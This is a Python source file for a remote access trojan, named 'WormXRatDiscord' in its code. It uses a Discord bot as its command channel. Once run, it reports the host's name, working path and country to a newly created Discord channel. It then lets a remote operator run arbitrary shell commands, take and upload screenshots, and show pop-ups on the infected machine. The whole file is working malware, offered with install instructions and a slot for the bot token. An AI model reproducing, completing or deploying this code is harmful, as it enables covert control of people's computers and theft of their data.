# pip install discord pillow pyautogui requests
# If not works after installion librares, try pip install discord pillow pyautogui requests pyscreeze

import discord
import socket
import subprocess
import pyautogui
import os
import uuid
import requests
import io
import threading
from tkinter import messagebox

session = uuid.uuid4()
TOKEN = "" # <---- Bot token discord

current_dir = os.getcwd()
intents = discord.Intents.default()
intents.message_content = True


try:
    response = requests.get('https://ipinfo.io/json')
    jsondataipinfo = response.json()
    country = jsondataipinfo.get('country', 'Unknown')
except:
    country = "Unknown"

client = discord.Client(intents=intents)
channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")


async def send_msg(channel, text):
    if len(text) > 1900:
        with io.BytesIO(text.encode('utf-8')) as out_file:
            await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
    else:
        await channel.send(f"```\n{text}\n```")


def show_popup(msg):
    messagebox.showinfo("WormXRatDiscord", msg)

@client.event
async def on_ready():
    global channel_ref
    try:
        guild = client.guilds[0]
        name = get_hostname()
        channel_ref = await guild.create_text_channel(name)
        
        header = (
            f"✅ Connected: `{name}`\n"
            f"📍 Path: `{current_dir}`\n"
            f"📍 Country: `{country}`\n"
            f"Session: `{session}`\n"
            "--- Commands ---\n"
            "`!cmd <command>` | `!screen` | `!chatsendmsg <text>`"
        )
        await channel_ref.send(header)
    except Exception as e:
        print(f"Error on_ready: {e}")

@client.event
async def on_message(message):
    global channel_ref, current_dir

    if message.author == client.user: return
    if channel_ref is None or message.channel.id != channel_ref.id: return

    
    if message.content == "!screen":
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
        try:
            pyautogui.screenshot(path)
            await message.channel.send(file=discord.File(path))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"Screenshot Error: {e}")

    
    elif message.content.startswith("!chatsendmsg "):
        announcemsg = message.content[len("!chatsendmsg "):].strip()
        userip = socket.gethostbyname(socket.gethostname())
        
        
        threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
        
        await message.channel.send(f"✅ Pop-up sent to `{userip}`. Bot is still responsive.")

    
    elif message.content.startswith("!cmd "):
        cmd = message.content[5:].strip()
        
        if cmd.startswith("cd "):
            new_path = cmd[3:].strip()
            try:
                temp_path = os.path.abspath(os.path.join(current_dir, new_path))
                if os.path.isdir(temp_path):
                    current_dir = temp_path
                    await message.channel.send(f"📍 Directory: `{current_dir}`")
                else:
                    await message.channel.send("❌ Error: Directory not found.")
            except Exception as e:
                await message.channel.send(f"❌ Error: {e}")
            return

        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, 
                encoding="cp852", errors="replace", cwd=current_dir
            )
            output = (result.stdout or result.stderr or "Executed (no output).").strip()
            
            
            await send_msg(message.channel, output)
            
        except Exception as e:
            await message.channel.send(f"Error executing command: {e}")

client.run(TOKEN)
